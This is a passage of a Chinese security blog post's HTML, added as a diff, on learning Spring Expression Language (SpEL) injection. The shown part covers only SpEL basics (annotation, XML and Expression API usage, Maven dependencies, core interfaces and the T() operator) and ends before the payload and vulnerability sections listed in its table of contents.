@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/img/128.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/img/128.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/img/96.ico">
+  <link rel="mask-icon" href="/img/128.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"kpa1on.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="什么是SpEL表达式Spring Expression  Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。它的语法类似于传统EL，但提供额外的功能，最出色的就是函数调用和简单字符串的模板函数。尽管有其他可选的 Java 表达式语言，如 OGNL, MVEL,JBoss EL 等等，但 Spel 创建的初衷是了给 Spring 社区提供一种简单而高效的表达式">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SpEL表达式注入学习">
+<meta property="og:url" content="https://kpa1on.github.io/2022/03/29/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="kpa1on&#39;s Blog">
+<meta property="og:description" content="什么是SpEL表达式Spring Expression  Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。它的语法类似于传统EL，但提供额外的功能，最出色的就是函数调用和简单字符串的模板函数。尽管有其他可选的 Java 表达式语言，如 OGNL, MVEL,JBoss EL 等等，但 Spel 创建的初衷是了给 Spring 社区提供一种简单而高效的表达式">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329142052563-1185828549.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329144847462-176527755.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329171117202-1289875588.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329184704655-640679280.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329185821845-924507104.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329190024398-1003926971.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212020428-2110315097.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212531370-1367392607.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212843266-47854455.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329214604858-144904379.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329215544902-59410262.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220031215-1991450169.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220356553-1188508612.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220705475-2061816981.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221109578-1370501255.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221432770-915349157.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221908395-113622263.png">
+<meta property="article:published_time" content="2022-03-29T02:34:10.000Z">
+<meta property="article:modified_time" content="2022-03-29T15:03:43.874Z">
+<meta property="article:author" content="kpa1on">
+<meta property="article:tag" content="注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329142052563-1185828549.png">
+
+
+<link rel="canonical" href="https://kpa1on.github.io/2022/03/29/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://kpa1on.github.io/2022/03/29/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/","path":"2022/03/29/SpEL表达式注入学习/","title":"SpEL表达式注入学习"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SpEL表达式注入学习 | kpa1on's Blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+ 
+<link rel="alternate" href="/atom.xml" title="kpa1on's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">kpa1on's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">keep passion！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">什么是SpEL表达式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">用法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81-Value"><span class="nav-number">2.1.</span> <span class="nav-text">1、@Value</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81bean%E9%85%8D%E7%BD%AE"><span class="nav-number">2.2.</span> <span class="nav-text">2、bean配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81Expression"><span class="nav-number">2.3.</span> <span class="nav-text">3、Expression</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="nav-number">2.4.</span> <span class="nav-text">配置环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E6%8E%A5%E5%8F%A3"><span class="nav-number">2.5.</span> <span class="nav-text">核心接口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E7%B1%BB%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">3.1.</span> <span class="nav-text">1、类表达式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="nav-number">3.2.</span> <span class="nav-text">2、方法调用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E8%B0%83%E7%94%A8%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-number">3.3.</span> <span class="nav-text">3、调用构造函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81Bean%E5%BC%95%E7%94%A8"><span class="nav-number">3.4.</span> <span class="nav-text">4、Bean引用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81%E5%8F%98%E9%87%8F%E5%AE%9A%E4%B9%89"><span class="nav-number">3.5.</span> <span class="nav-text">5、变量定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6%E3%80%81%E7%94%A8%E6%88%B7%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">3.6.</span> <span class="nav-text">6、用户自定义的方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7%E3%80%81%E6%A8%A1%E6%9D%BF%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">3.7.</span> <span class="nav-text">7、模板表达式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="nav-number">4.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84payload"><span class="nav-number">5.</span> <span class="nav-text">常用的payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">6.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SpringBoot-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">6.1.</span> <span class="nav-text">SpringBoot SpEL表达式注入漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kpa1on"
+      src="/img/96.ico">
+  <p class="site-author-name" itemprop="name">kpa1on</p>
+  <div class="site-description" itemprop="description">kpa1on的博客</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kpa1on" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kpa1on" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:l2kpa1on@gmail.com" title="E-Mail → mailto:l2kpa1on@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.wangan.com/docs/javasec" title="https:&#x2F;&#x2F;www.wangan.com&#x2F;docs&#x2F;javasec" rel="noopener" target="_blank">Java安全</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://javasec.org/" title="https:&#x2F;&#x2F;javasec.org&#x2F;" rel="noopener" target="_blank">JavaSec</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/kpa1on" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://kpa1on.github.io/2022/03/29/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/img/96.ico">
+      <meta itemprop="name" content="kpa1on">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kpa1on's Blog">
+      <meta itemprop="description" content="kpa1on的博客">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SpEL表达式注入学习 | kpa1on's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SpEL表达式注入学习
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-03-29 10:34:10 / 修改时间：23:03:43" itemprop="dateCreated datePublished" datetime="2022-03-29T10:34:10+08:00">2022-03-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>11k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>10 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <meta name="referrer" content="no-referrer"/>
+
+<h3 id="什么是SpEL表达式"><a href="#什么是SpEL表达式" class="headerlink" title="什么是SpEL表达式"></a>什么是SpEL表达式</h3><p>Spring Expression  Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。它的语法类似于传统EL，但提供额外的功能，最出色的就是函数调用和简单字符串的模板函数。尽管有其他可选的 Java 表达式语言，如 OGNL, MVEL,JBoss EL 等等，但 Spel 创建的初衷是了给 Spring 社区提供一种简单而高效的表达式语言，一种可贯穿整个 Spring 产品组的语言。这种语言的特性应基于 Spring 产品的需求而设计。<br> Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。</p>
+<span id="more"></span>
+
+<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>SpEL有三种用法，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p>
+<h4 id="1、-Value"><a href="#1、-Value" class="headerlink" title="1、@Value"></a>1、@Value</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class EmailSender &#123;</span><br><span class="line">    @Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span><br><span class="line">    private String mailUsername;</span><br><span class="line">    @Value(&quot;#&#123; systemProperties[&#x27;user.region&#x27;] &#125;&quot;)    </span><br><span class="line">    private String defaultLocale;</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、bean配置"><a href="#2、bean配置" class="headerlink" title="2、bean配置"></a>2、bean配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;xxx&quot; class=&quot;com.java.XXXXX.xx&quot;&gt;</span><br><span class="line">    &lt;!-- 同@Value,#&#123;&#125;内是表达式的值，可放在property或constructor-arg内 --&gt;</span><br><span class="line">    &lt;property name=&quot;arg&quot; value=&quot;#&#123;表达式&#125;&quot;&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="3、Expression"><a href="#3、Expression" class="headerlink" title="3、Expression"></a>3、Expression</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import org.springframework.expression.Expression;</span><br><span class="line">import org.springframework.expression.ExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.support.StandardEvaluationContext;</span><br><span class="line"> </span><br><span class="line">public class SpELTest &#123;</span><br><span class="line"> </span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"> </span><br><span class="line">        //创建ExpressionParser解析表达式</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        //表达式放置</span><br><span class="line">        Expression exp = parser.parseExpression(&quot;表达式&quot;);</span><br><span class="line">        //执行表达式，默认容器是spring本身的容器：ApplicationContext</span><br><span class="line">        Object value = exp.getValue();</span><br><span class="line">        </span><br><span class="line">        /**如果使用其他的容器，则用下面的方法*/</span><br><span class="line">        //创建一个虚拟的容器EvaluationContext</span><br><span class="line">        StandardEvaluationContext ctx = new StandardEvaluationContext();</span><br><span class="line">        //向容器内添加bean</span><br><span class="line">        BeanA beanA = new BeanA();</span><br><span class="line">        ctx.setVariable(&quot;bean_id&quot;, beanA);</span><br><span class="line">        </span><br><span class="line">        //setRootObject并非必须；一个EvaluationContext只能有一个RootObject，引用它的属性时，可以不加前缀</span><br><span class="line">        ctx.setRootObject(XXX);</span><br><span class="line">        </span><br><span class="line">        //getValue有参数ctx，从新的容器中根据SpEL表达式获取所需的值</span><br><span class="line">        Object value = exp.getValue(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里接口<code>ExpressionParser</code>负责解析表达式字符串。上述代码含义为首先创建<code>ExpressionParser</code>解析表达式，之后放置表达式，最后通过<code>getValue</code>方法执行表达式，默认容器是spring本身的容器：<code>ApplicationContext</code>。</p>
+<h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.11&lt;/version&gt;</span><br><span class="line">			&lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-expression&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="核心接口"><a href="#核心接口" class="headerlink" title="核心接口"></a>核心接口</h4><ol>
+<li>解析器<code>ExpressionParser</code>，用于将字符串表达式转换为<code>Expression</code>表达式对象。</li>
+<li>表达式<code>Expression</code>，最后通过它的<code>getValute</code>方法对表达式进行计算取值。</li>
+<li>上下文<code>EvaluationContext</code>，通过上下文对象结合表达式来计算最后的结果。</li>
+</ol>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>SpEL使用 <code>#&#123;...&#125;</code> 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：</p>
+<blockquote>
+<p>引用其他对象:<code>#&#123;car&#125;</code><br>引用其他对象的属性：<code>#&#123;car.brand&#125;</code><br>调用其它方法 , 还可以链式操作：<code>#&#123;car.toString()&#125;</code></p>
+</blockquote>
+<p>其中属性名称引用还可以用<code>$</code>符号 如：<code>$&#123;someProperty&#125;</code><br>除此以外在SpEL中，使用<code>T()</code>运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的<code>Math</code>类，我们可以像下面的示例这样使用<code>T()</code>运算符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(java.lang.Math)&#125; //结果会返回一个`java.lang.Math`类对象。</span><br></pre></td></tr></table></figure>
+
